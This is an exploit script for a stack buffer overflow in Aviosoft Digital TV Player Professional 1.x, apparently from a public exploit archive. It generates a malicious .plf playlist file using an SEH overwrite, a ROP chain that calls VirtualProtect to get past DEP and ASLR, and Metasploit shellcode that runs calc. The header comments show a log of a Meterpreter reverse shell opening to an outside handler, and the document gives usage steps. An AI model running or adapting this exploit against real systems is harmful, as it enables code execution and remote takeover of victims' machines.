# Exploit Title: Aviosoft Digital TV Player Professional 1.x Stack Buffer Overflow
# Author: modpr0be
# Software Download: http://www.aviosoft.com/download.php?product=dtvplayerpro
# Date: 08/11/2011
# Tested on: Windows XP SP3, Windows 7 SP1
# Thanks: corelanc0d3r, cyb3r.anbu, otoy, sickness, 5m7x, loneferret, _sinn3r, mr_me

# 
# msf  exploit(handler) > exploit 
#
# [*] Started reverse handler on 10.5.5.5:443 
# [*] Starting the payload handler...
# [*] Sending stage (752128 bytes) to 10.5.5.14
# [*] Meterpreter session 1 opened (10.5.5.5:443 -> 10.5.5.14:49592) at 2011-09-27 21:15:34 +0700
# 
# meterpreter > sysinfo
# Computer        : M1ABRAMS
# OS              : Windows 7 (Build 7601, Service Pack 1).
# Architecture    : x86
# System Language : en_US
# Meterpreter     : x86/win32
# meterpreter >
# 
# but this time, it will pop up calc
# How to:
# open aviosoft digital tv player --> load playlist --> choose adtv_bof.plf --> calc
# it's generated using mona.py with some modifications ;) thx corelanc0d3r

#!/usr/bin/python

import struct
file = 'adtv_bof.plf'

totalsize = 5000
junk = 'A' * 872
align = 'B' * 136

# aslr, dep bypass using pushad technique
seh = struct.pack('<L', 0x6130534a)			# ADD ESP,800 # RETN
rop = struct.pack('<L', 0x61326003) * 10	# RETN (ROP NOP)
rop+= struct.pack('<L', 0x6405347a)		# POP EDX # RETN
rop+= struct.pack('<L', 0x10011108)		# ptr to &VirtualProtect()
rop+= struct.pack('<L', 0x64010503)		# PUSH EDX # POP EAX # POP ESI # RETN
rop+= struct.pack('<L', 0x41414141)		# Filler (compensate)
rop+= struct.pack('<L', 0x6160949f)		# MOV ECX,DWORD PTR DS:[EDX] # POP ESI
rop+= struct.pack('<L', 0x41414141) * 3		# Filler (compensate)
rop+= struct.pack('<L', 0x61604218)		# PUSH ECX # ADD AL,5F # XOR EAX,EAX # POP ESI # RETN 0C
rop+= struct.pack('<L', 0x41414141) * 3		# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x6403d1a6)		# POP EBP # RETN
rop+= struct.pack('<L', 0x41414141) * 3		# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x60333560)		# & push esp #  ret 0c
rop+= struct.pack('<L', 0x61323EA8)		# POP EAX # RETN
rop+= struct.pack('<L', 0xA13977DF)		# 0x00000343-> ebx
rop+= struct.pack('<L', 0x640203fc)			# ADD EAX,5EC68B64 # RETN
rop+= struct.pack('<L', 0x6163d37b)		# PUSH EAX # ADD AL,5E # POP EBX # RETN
rop+= struct.pack('<L', 0x61626807)		# XOR EAX,EAX # RETN
rop+= struct.pack('<L', 0x640203fc)			# ADD EAX,5EC68B64 # RETN
rop+= struct.pack('<L', 0x6405347a)		# POP EDX # RETN
rop+= struct.pack('<L', 0xA13974DC)		# 0x00000040-> edx
rop+= struct.pack('<L', 0x613107fb)		# ADD EDX,EAX # MOV EAX,EDX # RETN
rop+= struct.pack('<L', 0x60326803)		# POP ECX # RETN
rop+= struct.pack('<L', 0x60350340)		# &Writable location
rop+= struct.pack('<L', 0x61329e07)		# POP EDI # RETN
rop+= struct.pack('<L', 0x61326003)		# RETN (ROP NOP)
rop+= struct.pack('<L', 0x60340178)		# POP EAX # RETN
rop+= struct.pack('<L', 0x90909090)		# nop
rop+= struct.pack('<L', 0x60322e02)		# PUSHAD # RETN

nop = '\x90' * 32

# windows/exec - 223 bytes
# http://www.metasploit.com

calc = (
"\xbf\x77\xbf\x23\x29\xdd\xc1\xd9\x74\x24\xf4\x58\x2b\xc9"
"\xb1\x32\x31\x78\x12\x03\x78\x12\x83\xb7\xbb\xc1\xdc\xcb"
"\x2c\x8c\x1f\x33\xad\xef\x96\xd6\x9c\x3d\xcc\x93\x8d\xf1"
"\x86\xf1\x3d\x79\xca\xe1\xb6\x0f\xc3\x06\x7e\xa5\x35\x29"
"\x7f\x0b\xfa\xe5\x43\x0d\x86\xf7\x97\xed\xb7\x38\xea\xec"
"\xf0\x24\x05\xbc\xa9\x23\xb4\x51\xdd\x71\x05\x53\x31\xfe"
"\x35\x2b\x34\xc0\xc2\x81\x37\x10\x7a\x9d\x70\x88\xf0\xf9"
"\xa0\xa9\xd5\x19\x9c\xe0\x52\xe9\x56\xf3\xb2\x23\x96\xc2"
"\xfa\xe8\xa9\xeb\xf6\xf1\xee\xcb\xe8\x87\x04\x28\x94\x9f"
"\xde\x53\x42\x15\xc3\xf3\x01\x8d\x27\x02\xc5\x48\xa3\x08"
"\xa2\x1f\xeb\x0c\x35\xf3\x87\x28\xbe\xf2\x47\xb9\x84\xd0"
"\x43\xe2\x5f\x78\xd5\x4e\x31\x85\x05\x36\xee\x23\x4d\xd4"
"\xfb\x52\x0c\xb2\xfa\xd7\x2a\xfb\xfd\xe7\x34\xab\x95\xd6"
"\xbf\x24\xe1\xe6\x15\x01\x1d\xad\x34\x23\xb6\x68\xad\x76"
"\xdb\x8a\x1b\xb4\xe2\x08\xae\x44\x11\x10\xdb\x41\x5d\x96"
"\x37\x3b\xce\x73\x38\xe8\xef\x51\x5b\x6f\x7c\x39\x9c")

sisa = 'C' * (totalsize - len(seh+rop+nop+calc))

payload = junk+seh+align+rop+nop+calc+sisa

f = open(file,'w')
print "Author: modpr0be"
print "Payload size: ", len(payload)
f.write(payload)
print "File",file, "successfully created"
f.close()